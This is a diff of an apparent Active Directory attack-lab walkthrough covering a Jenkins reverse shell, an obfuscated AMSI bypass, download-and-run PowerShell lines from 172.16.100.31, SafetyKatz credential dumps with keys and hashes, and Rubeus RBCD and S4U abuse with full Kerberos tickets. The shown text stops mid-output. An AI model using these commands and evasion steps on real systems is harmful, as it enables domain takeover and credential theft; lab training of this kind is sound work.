@@ -665,7 +665,7 @@ dcorp-adminsrv  dcorp\websvc        True
 ### We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
 **We can use Powerview’s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging**
 
-* PS C:\Users\Administrator\.jenkins\workspace\Project731> iex (iwr http://172.16.100.31/sbloggingbypass.txt -UseBasicParsing)
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> iex (iwr http://172.16.100.31/sbloggingbypass.txt -UseBasicParsing)
 
 ### bypass AMSI
 ```
@@ -687,7 +687,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) (
 
 **Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open**
 
-* PS C:\Users\Administrator\.jenkins\workspace\Project731> winrs -r:dcorp-mgmt cmd /c "set computername && set username"
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 ```
 COMPUTERNAME=DCORP-MGMT
 USERNAME=ciadmin`
@@ -695,10 +695,10 @@ USERNAME=ciadmin`
 
 **We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to  copy Loader.exe on dcorp-mgmt Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt**
 
-* PS C:\Users\Administrator\.jenkins\workspace\Project731>iwr http://172.16.100.31/Loader.exe -OutFile C:\Users\Public\Loader.exe
+* PS C:\Users\Administrator\.jenkins\workspace\Project0>iwr http://172.16.100.31/Loader.exe -OutFile C:\Users\Public\Loader.exe
 
 **Now, copy the Loader.exe to dcorp-mgmt**
-* PS C:\Users\Administrator\.jenkins\workspace\Project731> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 Does \\dcorp-mgmt\C$\Users\Public\Loader.exe specify a file name
 or directory name on the target
@@ -709,11 +709,11 @@ C:\Users\Public\Loader.exe
 ```
 
 **Add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt**
-* PS C:\Users\Administrator\.jenkins\workspace\Project731> $null | winrs - r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> $null | winrs - r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
 
 **To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader**
 
-* PS C:\Users\Administrator\.jenkins\workspace\Project731> $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 [snip]
 Authentication Id : 0 ; 58866 (00000000:0000e5f2)
@@ -3059,7 +3059,7 @@ C:\AD\Tools\Loader.exe
 * C:\Windows\system32> winrs -r:dcorp-appsrv cmd
 * C:\Users\appadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.31
 * C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
-* C:\Users\appadmin>C:\Users\Public\Loader.exe -path http://172.16.100.31/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
+* C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://172.16.100.31/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
 ```
 [+] Successfully unhooked ETW!
 [+++] NTDLL.DLL IS UNHOOKED!
@@ -3392,8 +3392,8 @@ name                     : web svc
 We already have secrets of websvc from dcorp-admisrv machine. We can use Rubeus to abuse that. 
 
 ### Abuse Constrained Delegation using websvc with Rubeus
-In the below command, we request a TGS for websvc as the Domain Administrator - Administrator. Then 
-the TGS used to access the service specified in the /msdsspn parameter (which is filesystem on dcorp-mssql)
+In the below command, we request a TGS for websvc as the Domain Administrator - Administrator. 
+Then the TGS used to access the service specified in the /msdsspn parameter (which is filesystem on dcorp-mssql)
 
 * C:\Users\student731> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
 ```
@@ -3846,28 +3846,2993 @@ We can either use the reverse shell we have on dcorp-ci as ciadmin or extract th
 Let's use the reverse shell that we have and load PowerView there.
 
 * C:\Users\student1> cls
-C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
 
-* PS C:\Users\Administrator\.jenkins\workspace\Project731> iex (iwr http://172.16.100.X/sbloggingbypass.txt -UseBasicParsing)
+* powershell.exe iex (iwr http://172.16.100.31/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.31 -Port 443
+
+* C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+```
+listening on [any] 443 ...
+172.16.3.11: inverse host lookup failed: h_errno 11004: NO_DATA
+connect to [172.16.100.31] from (UNKNOWN) [172.16.3.11] 56838: NO_DATA
+Windows PowerShell running as user ciadmin on DCORP-CI
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+```
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> iex (iwr http://172.16.100.31/sbloggingbypass.txt -UseBasicParsing)
 
 * Bypass AMSI
 ```
- S`eT-It`em ( 'V'+'aR' 
-+ 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-
-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL 
-)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -
-f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f 
-'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 
-AlteredSecurity Attacking and Defending Active Directory 95
-'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( 
-"{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 
-'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -
-f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
-* PS C:\Users\Administrator\.jenkins\workspace\Project731> iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1'))
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.31/PowerView.ps1'))
 
 Now, configure RBCD on dcorp-mgmt for the student VMs. 
 You may like to set it for all the student VMs in your lab instance so that your fellow students can also abuse RBCD
+* C:\Users\student731>hostname
+```
+dcorp-std731
+```
 
-* PS C:\Users\Administrator\.jenkins\workspace\Project731> Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std731$' -Verbose
+
+### Check if RBCD is set correctly
+
+* PS C:\Users\Administrator\.jenkins\workspace\Project0> Get-DomainRBCD
+```
+SourceName                 : DCORP-MGMT$
+SourceType                 : MACHINE_ACCOUNT
+SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
+SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
+SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
+ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local, TERMSRV/DCORP-MGMT,
+                             TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
+DelegatedName              : DCORP-STD731$
+DelegatedType              : MACHINE_ACCOUNT
+DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-20691
+DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
+DelegatedDistinguishedName : CN=DCORP-STD731,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
+
+```
+
+Get AES keys of your student VM (as we configured RBCD for it above). Run the below command from 
+an elevated shell.
+
+* C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+```
+Authentication Id : 0 ; 27425 (00000000:00006b21)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/29/2025 10:17:55 AM
+SID               : S-1-5-96-0-0
+
+         * Username : DCORP-STD731$
+         * Domain   : dollarcorp.moneycorp.local
+         * Password : .dy8C1``'!l]DSk#D5%R 6-'Hh+HDyg!0Fp[RD<P9-p#CFM@`pmq%HLM9Ta^dXJefzvyG50&VnY\_C#8(@f*F>y(*]d+,8?VZ!^<\E_Pe;n`lc0mo0MU]wca
+         * Key List :
+           aes256_hmac       6ea583276ca6036d6b0b2431f6f84e37d93bd4d3fd78b5f833fd7a20f947c90d
+           aes128_hmac       97c9f95ab60f0012a588fbea394179ca
+           rc4_hmac_nt       734a4edac0d591080d63e0682259bd0c
+           rc4_hmac_old      734a4edac0d591080d63e0682259bd0c
+           rc4_md4           734a4edac0d591080d63e0682259bd0c
+           rc4_hmac_nt_exp   734a4edac0d591080d63e0682259bd0c
+           rc4_hmac_old_exp  734a4edac0d591080d63e0682259bd0c
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DCORP-STD731$
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 9/29/2025 10:17:54 AM
+SID               : S-1-5-18
+
+         * Username : dcorp-std731$
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       7a27508c61e5952b643bb78ecdefee61a8a0a4ba4a30cbf7416825c5be26d37c
+           rc4_hmac_nt       734a4edac0d591080d63e0682259bd0c
+           rc4_hmac_old      734a4edac0d591080d63e0682259bd0c
+           rc4_md4           734a4edac0d591080d63e0682259bd0c
+           rc4_hmac_nt_exp   734a4edac0d591080d63e0682259bd0c
+           rc4_hmac_old_exp  734a4edac0d591080d63e0682259bd0c
+
+mimikatz(commandline) # exit
+Bye!
+
+```
+
+### With Rubeus, abuse the RBCD to access dcorp-mgmt as Domain Administrator - Administrator.
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:DCORP-STD731$ /aes256:7a27508c61e5952b643bb78ecdefee61a8a0a4ba4a30cbf7416825c5be26d37c /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
+
+```
+[snip]
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : s4u /user:DCORP-STD731$ /aes256:7a27508c61e5952b643bb78ecdefee61a8a0a4ba4a30cbf7416825c5be26d37c /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
+[*] Action: S4U
+
+[*] Using aes256_cts_hmac_sha1 hash: 7a27508c61e5952b643bb78ecdefee61a8a0a4ba4a30cbf7416825c5be26d37c
+[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\DCORP-STD731$'
+[*] Using domain controller: 172.16.2.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGMjCCBi6gAwIBBaEDAgEWooIFFjCCBRJhggUOMIIFCqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
+      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
+      BLIwggSuoAMCARKhAwIBAqKCBKAEggScxVePnLoCWrrfN3XPSC+MbW9byYXnjroAQiLPO8+rD4eMKg05
+      294tbm8pdZS0z5GK5t3ixnAeHvpcr3NyH26lN9f2FTW5elArqfNlwgVUFXMSfAJQzEBMQQZynDvDjsi3
+      JsYoi9hSL7Jdj4vI2sw7nhTRl6OmwzWynFRJNX40ecjpRahxMV/MRQeYz3eRk8Q2QBn43B6nlt1E1Vc8
+      oVLWyI2Va4UZ6fwJ5JuQ8XbBc3UHwsOmnh0nzmoCVMZG9u0god0Lj5jvPBMX8dim6duOjkbAUhOgSolf
+      m2hn6UcyHe+gj9MsxG3vg0oiqVufbSfmntS3UvG30XgDXfxn5RX98qPKqenRU8iBAHKQPJW2FLa+YY7r
+      ZMEre7fNcGeZoM+T3bzffU09IY2DZWWfzCUmOWAIwCzb6QORBSspapiROoExfLVCcKM+edC0azXNKEPk
+      ZvOoKgSWyNR3YEEcZWCjdpyEIuBkhmtd6DBMAiVmT0ncJbHbKlvewQKZ3wwvRgw/7Yqt9k349/ZsgwYv
+      yo0YNSZm04uN1GHqGxqHUh6mVGblTyTlwHIp05QgNN2flBsp14Z1A4u8uc3vu5SAwgcaoSYcAmHqOnar
+      Rhu5aUT+lJr9+psHwo5XDmJWXlQ+qjH2vYrE4rh0QEuQurNIqENKA754K1KR03+ZxtK3vDBdwtt1FwCp
+      CXi77kOQwdh3cId8pm6aeD+/H/T4VUdEjinlpl1kBLz+5yZ1HWz1FaJkXANn8Leec9hgXs+/mgbtoU7i
+      FFjH+M4l4JwO5YLkFT1UtDcMIBTq2/MpA6hX7l8YY9+ZwGf+7krfAwDDdVtVZ34cjP7mKNCUoL5uNJNH
+      S3shVysnwJsyDdxYOFkUucScOqguvA8NZGL6EgAGZu6yVdP9qsixiupdLzvjyEZtAeweeNWZoq0BL7/X
+      B7TlFPKJ5ptFvzxFnN9eH0izRcfB+tiPq1bm6rT62zZS7curV1LVit3yeLe4O1hhwK+HwZuOp26ACr9e
+      1TSrigV4B/aJpFERYLkuScK1Wj3AIoaN+OXsZUkNb8VJ5Q58bYfWvE4n1y1VeBRgMHUdCUXFCCpcDOp9
+      p9uDOWzXYlU44QebTGulO4T9oFZY4X9tBDcsrhLV+zaMcM5FzYcemRkIbpQtXsGacrAg3Z7pwue79vZB
+      H3WO99XjP9z/anUiHT2FYxs1iDU9iW1vJCD2J81qCKxwPS6f0LDvcoAH3gp7QfwfSCeuJMLrXLyG/7+i
+      ILzd4rp/62t+TbZi+SCJaKiJO8JFcBuW1TLQp5so6X7TrnqvUyMdTzzI6tgS0kutbJD8itepx2XfPPIR
+      mpxm00jyuVXy/gGoSKTQt4qwtUvx9yjrQ4N0prKk17POt1Dhx9up9Qg9A6ZhGkcwqkygOwBoXXid4NCf
+      LLQCWykuo+YxfnpAbZtHd2Ql3izCXGM3j5RawNNQtaf4drZFUimc780EtUZiOnw1IiXvEjas5p8xDlaC
+      8ZNgrozT82k1DQgvuZE4nGXROKEWN6SAruaS8aKDwo/XJYAb2M1DbpFovSayDHvYqbIt6BTIW0WVYTrS
+      sq1NL6OCAQYwggECoAMCAQCigfoEgfd9gfQwgfGgge4wgeswgeigGzAZoAMCARehEgQQYVgCKIGVdhoJ
+      KHG5pBfYnaEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDURDT1JQLVNU
+      RDczMSSjBwMFAEDhAAClERgPMjAyNTA5MjkyMDQ4MTlaphEYDzIwMjUwOTMwMDY0ODE5WqcRGA8yMDI1
+      MTAwNjIwNDgxOVqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMCAQKhJjAkGwZrcmJ0
+      Z3QbGmRvbGxhcmNvcnAubW9uZXljb3JwLmxvY2Fs
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'DCORP-STD731$@DOLLARCORP.MONEYCORP.LOCAL'
+[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
+[*] Sending S4U2self request to 172.16.2.1:88
+[+] S4U2self success!
+[*] Got a TGS for 'administrator' to 'DCORP-STD731$@DOLLARCORP.MONEYCORP.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIGVzCCBlOgAwIBBaEDAgEWooIFQTCCBT1hggU5MIIFNaADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
+      T1JQLkxPQ0FMohowGKADAgEBoREwDxsNRENPUlAtU1RENzMxJKOCBPIwggTuoAMCARKhAwIBCaKCBOAE
+      ggTc/JMnfpeKcOQUT+9nlTcdSBuQucp7cHm5oGxQGsVCpBboA/Hz/bjOK/n9vjJzen7sjHJrwM5sY6os
+      4R/gtV0pYYOUjcjpiisk0emmkfsOx4wBy61WEQjmGJ7+ncPuOZB1037ruMEsLI/nh3szaQvpYhCS+tH8
+      tC+6HCjikS8CGv+OVL6+OcTpCNVLNg9ymF/nDSSClkoixwqEAdHGuSgGolpeu3WOv2ZQ88WL3SWqwFOX
+      sRhKrdIUgQfzUIqyhgl/P7BOIn7+daZn6Z6svmjWJz7mO4XUpoLKluy7DsbIqEF72asX3C7FG7kc0sWy
+      +GbbiKUHJHLAbQUf72UDzf1fcXAweMdYnP9eRlEndqu/vmenFNKbVESMOmrGGJjWryBfizsb8uBtZa+p
+      Hs+F3wmzbOPo6WC0SEq44aAV1VnHFjblLWL2PD7fkcko4GfIJ0X9ltC8NTaX1+U81K4W0cezBl/A5Cyp
+      0M6ZxVOQaLus03JjPIYHO3u9JPTnVryZkdqKkxm9FsKrKpq3WImmqKpiKbKawi9aF3g49bBAisO89zlJ
+      zl8iX5OImxrdqNF51u8X5ZLP+iXXnwJ6FxymT9MsZpNbBqi5e0m/lQJYdQo6yOm+/EnNhKkUbHPl8j9e
+      VO58h9dvtY54noeJ8fFHpDAxOYe18GdZS11+JBDMaLu2mQD3doTwLOcFhivb0D1coh8EVKPcprQaBE6s
+      sL6H4CU/TNdFfpdeViJzx4tVn1g+tErmjsK69eP5eD52UD9aJPwsojeHMNCK+szt7flaBCUmSV6K4bwf
+      bGrCmYjpugj09w9PTjtTAhYd+jRVzH5Ykuj3lgDW3jdD5h+KPWqBOOlXhTsRN9xPQu5Rj2nLA87VqKG8
+      X2QfLEQ8GqPrneQl5DfURySYN0akxzjfNsFTWa0z4PIxsK6CpvXWdEteVgO4KYGwXcE60cqLqAa2aGYc
+      sRWQKyykyjf7g5wfHz+A+Rp/NlYM+ZNmdW+fMxtGscqGRU486KqneGF0t2jsB4cHS2WBfmlPMzRQGN11
+      niordrKAAQCoROzBTh2h1jNOcyZo/NnVJB4XdH12uyaHLGSrCtu8yStwAvWJ47RHdm4Q/yHdvTI4z5TT
+      /WIFLBjXSZDDna7oIQ9D8f7HfYlKo9qFhRzuV43H/vOEBetKBeuQ/1mylBaZ6kLpr13h+GGjjL0enyQe
+      61kSiFz8HRr+OXQg8Rkaaobt4/+Q6I2pFigEF3pQhYyiF7J/2WemqzmdlOQQwtXNVec44Z0ON3xGFoDs
+      ij1jMfjbIZhe5fAOG0dDbsOimrwxGQcXf9P5arz+5P5BdD2Xhxpej0OvYKFxZaH5fuOR2Fdxl42bUhvm
+      Zi7bXJuFJ8d2GqCFt8dwGiriX/CY1KPZ0l5+MZuMWGyZLfY1eB8+8ti1dS4aMZwaUJpi1WM3wQQEJqG2
+      L1EFA3UZLYHoUKTXzRZjPhSCbt+fs3gSYhFzP3Xaof2GxzcfdvTuHVrxzk0cgtbLdll4oTcCh58Cz1Ys
+      L70WLymy1rXfvxgz5TNz30c8+tocE5HSHTodkWTxf1pITM6HXHpPZLbrQaplKx8X2jL3leoP2z6j0v6E
+      b+fpyLf4GUwxoFhPL5T4OaXT2Ze/AWMP0q7jonx+fRoJsaixtfZVz5e3eaggqWujggEAMIH9oAMCAQCi
+      gfUEgfJ9ge8wgeyggekwgeYwgeOgKzApoAMCARKhIgQgmcwFDIy4t2RgF7cTvdP2mkT0AK9dEBwj489l
+      ddX0N0ihHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJh
+      dG9yowcDBQBAoQAApREYDzIwMjUwOTI5MjA0ODE5WqYRGA8yMDI1MDkzMDA2NDgxOVqnERgPMjAyNTEw
+      MDYyMDQ4MTlaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqRowGKADAgEBoREwDxsNRENPUlAt
+      U1RENzMxJA==
+
+[*] Impersonating user 'administrator' to target SPN 'http/dcorp-mgmt'
+[*] Building S4U2proxy request for service: 'http/dcorp-mgmt'
+[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
+[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'http/dcorp-mgmt':
+
+      doIHBDCCBwCgAwIBBaEDAgEWooIF/DCCBfhhggX0MIIF8KADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
+      T1JQLkxPQ0FMoh0wG6ADAgECoRQwEhsEaHR0cBsKZGNvcnAtbWdtdKOCBaowggWmoAMCARKhAwIBAaKC
+      BZgEggWUv9fPd0tL2gNnOT3xPfULC5ynD1aXDfTFYJWXmhSEVws3hANnf2Cg6S3CgBFeI1KSFfv7UyDw
+      +EwkOM4bUFreaF5ZddNx/sgMH5Aa7BA4GYjB5bh4k51CAifJ36zO5E/joSzOxBsqUtLJ2EdWIsh1uSj9
+      k+ro3J2DbiZuTK/Iy3isHEpNsaMZtIEDGgBjjR9uo++Or3i2W1ZKP/BqvuYTzcA4+eziHT6gsfeaM9c4
+      xlOswi721D1BSt+ZynIHJ/PuMsR/GT+mokMljbqJt969cF254wFWztXgZpfpH82uSGNZJDSKvTyD4UOV
+      WPcKAEtxkmy35sfTjy/Y5KOVvnR+Lr2geLA4NQEaxbjjYG1R47KetonOVqTNebCnGW6gk4Y5AXRLky4y
+      uQYNrmLBzTPP4kj+O5NOK2AfJqzsvxHfnC9kNfJv3PAsO8c3v/5PNu4o6vsIKD1Llva/sF4bSvUfRA9E
+      eGs/8ir6E9xV5RsUNexvocH75a6cGSRcqUzlbOWHvl9FpUv2hGCtkye8FmN9R4GdFBirolLl0UhzUq4o
+      Df9PMm1T0SlfR6ht5LjdEK7zsDqIYFHFjzvU4AeWb0fLfuZb69BZdmKqcCRZ38D0NLd9ytw8BuFzby+F
+      lS3mAh/+38sK7KFDvfdhXM7N8yLJz5UgMrqBhVLTCh09aBLYfT74Wmmds0X21s+WMEW/zbPlQ4bwt3X9
+      SuLEKtjTA6TkD42z0K5M8i8TW3sUcRKv2yyZjQNeCQhRP4in5LpJnrhO7+aoQMpiCVPmSwvtRv1Rqhp8
+      GEIyXcfBar49ZlA0eZkIsxpiDkXRYPOeShQxX+YkeogD3ikQltPoNldy+lXOwxehBFqoSKm544SOHfDx
+      bp7jAWrWlrC70rS8YtqlGWD6495iITHYqAZ/0KzAnaeN/PTi+CyjxooaHrgcPWcJHRe77RifOloNIl5X
+      yg0sPeV/RbdVwcdlp6iCNE6y4GYn24ofOWCyGuVc3MuiumkOxwmn93xnMRUjeEUkckcwUQ0Fo7nH5m7t
+      CWT2cgAhN63fXZtqnfRBvI8dEWuNEtPfScC6mNSEC8HVonJBuX6vHD1edB/DVchl+06ouds59+sfNogd
+      UZbFceGLZUEASLNkBxoQyGKKoO98HxEi/mIAmjtlZmVHgc7Qjj8Mn6BviL5H6JLCZeGDfg+ybGs/+SrW
+      PQZ8KokRCkyVkRSQE8p40cq31DlQiZQruiHHI/FoMXHOEC8TnNqgg+XZGOODIjC02uBEMRGvn6hTMv0S
+      eyAGn6WI9fwhodmrq2l0hgNDFmp/0c3Vteu1Y3EEz7qlesW+M79KG/VMAlOpdqVQ9MnUIps0/+uKbbuD
+      KtpU820xqCqFTTP6o5Gaqom8tiefylfpo+pkTFsqBgZtmfXGfF3x1fj80KB++Wk1bvQeFN35EUHusKS+
+      Psu6sg7sbMJ5zhAPyXHwa2GwyTZWbw5rHm3CHKIE9ytyxQlpxTnYZoHsWff7pPHaxWYJJ0DuhjBBNmkD
+      xVwTLQR0v+t0JEzZVeTufVH31v6r3iNJ7p8Fj7fkwdQ3BHjkvZVaL/Kqaqyc2/4h7lH1bfSRjYTriyuE
+      YAZHJKNjzqy+cxYNKUzroGV5lfGK5X2D99Fv3D4qyJ30bTvbj03bP+deJFeyE833Zbd5HTgpCH4NeFh3
+      9d+0R4T65MPzFgs/MrJJKDcWBw8OPudSGYC5XGGoddJfxWLW0HgoquEkbGvrtgvhC6FGWz+k9OLoSWMP
+      jrsq7j9VDjgwt/895cQ0B4gxWGNy25hOwt9RuN8zarQIJ1fqLl+oYck8nZOuQi8wsrtvZCLfWD2n1LV5
+      qlmRSBpogofcmFWEKG1xjwCbRXjXujJZLuy3PKIOONeTKitI/9RMAfwVOL21NdnpaMDuLUd7o4HzMIHw
+      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARGhEgQQLhkrFmmv8XQYp7hc/PsNMqEcGxpE
+      T0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAECh
+      AAClERgPMjAyNTA5MjkyMDQ4MTlaphEYDzIwMjUwOTMwMDY0ODE5WqcRGA8yMDI1MTAwNjIwNDgxOVqo
+      HBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypHTAboAMCAQKhFDASGwRodHRwGwpkY29ycC1tZ210
+[+] Ticket successfully imported!
+```
+
+* C:\Users\student731> winrs -r:dcorp-mgmt cmd
+```
+Microsoft Windows [Version 10.0.20348.2762]
+(c) Microsoft Corporation. All rights reserved.
+```
+
+* C:\Users\Administrator.dcorp> whoami
+```
+whoami
+dcorp\administrator
+```
+
+* C:\Users\Administrator.dcorp> set computername
+```
+set computername
+COMPUTERNAME=DCORP-MGMT
+```
+
+## Learning Objective 18
+```
+• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admins using 
+the domain trust key. 
+```
+
+### Extract the trust key
+We need the trust key for the trust between dollarcorp and moneycrop, which can be retrieved using 
+Mimikatz or SafetyKatz.
+
+Start a process with DA privileges. Run the below command from an elevated command prompt.
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+[*] Action: Ask TGT
+
+[*] Got domain: dollarcorp.moneycorp.local
+[*] Showing process : True
+[*] Username        : W74P51YX
+[*] Domain          : TYHRERMF
+[*] Password        : RW5PCL0W
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 1132
+[+] LUID            : 0x2597b9
+
+[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
+[!] Pre-Authentication required!
+[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
+[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
+[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
+[*] Target LUID : 2463673
+[*] Using domain controller: 172.16.2.1:88
